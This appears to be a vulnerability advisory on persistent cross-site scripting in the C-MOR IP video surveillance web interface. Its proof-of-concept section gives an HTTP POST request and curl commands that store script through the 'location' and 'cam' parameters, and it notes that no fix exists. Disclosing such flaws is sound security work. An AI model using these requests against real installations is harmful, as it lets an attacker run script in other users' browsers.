~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Overview:

The software product C-MOR is an IP video surveillance system.

The manufacturer describes the product as follows:

"With C-MOR video surveillance, it is possible to check your
surveillance over network and the Internet. You can access the live
view as well as previous recordings from any PC or mobile device.
C-MOR is managed and controlled over the C-MOR web interface.
IP settings, camera recording setup, user rights and so on are set
over the web without the installation of any software on the
client."[1]

Due to improper input validation, the C-MOR web interface is vulnerable
to persistent cross-site scripting attacks.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Vulnerability Details:

By analyzing the C-MOR web interface, it was found that the camera
configuration is vulnerable to a persistent cross-site scripting attack
due to insufficient user input validation.

This kind of attack enables an attacker to persistently store attack
vectors in form of arbitrary code, for instance JavaScript code, in the
web application database, which may be executed in the context of other
users.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Proof of Concept (PoC):

An authenticated user can set the location of a camera. If valid
JavaScript code is used as location value, this code will be
persistently stored in the web application database.

The injected JavaScript code is served to users and executed in their
web browser's context when using different functionality of the C-MOR
web interface, for instance camera settings via "show-movies.plm" or
system administration via "systemadministration.plm".

The following HTTPS POST request illustrates storing an attack vector
via the parameter "location":

POST /changelocation.pml HTTP/1.1
Host: <HOST>
Authorization: Basic <CREDENTIALS>
Content-Type: application/x-www-form-urlencoded
Content-Length: 81

location=location%3Cscript%3Ealert%28%22SySS+XSS%21%22%29%3C%2Fscript%3E&cam=cam1


An excerpt of the resulting HTML source code containing the injected
JavaScript code is shown below:

(...)
<input type=submit value="Aufzeichnung aktivieren" class="link_button2"> 
location<script>alert("SySS XSS!")</script><br>
(...)

This PoC attack can be performed using the following curl command:

curl -X POST -d 'location=location<script>alert("SySS 
XSS!")</script>&cam=cam1' --user "<USERNAME>:<PASSWORD>" --insecure 
--ciphers 'DEFAULT:!DH' https://<HOST>/changelocation.pml


In version 6.00PL01, persistent cross-site scripting vulnerabilties have
not been fixed completely. For example, the following attack vector can
successfully store attacker-controlled JavaScript code in the logs:

curl -X POST \
    -d 'cam=</textarea><script>alert("Hello from 
XSS")</script><textarea>&days=1100' \
    --user "<USERNAME>:<PASSWORD>" \
    --insecure \
    --ciphers 'DEFAULT:!DH' \
    https://<HOST>/show-movies.pml

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Solution:

The described security vulnerability has not been fixed entirely in the
newly released software version 6.00PL01.

There is no fix for this security issue.
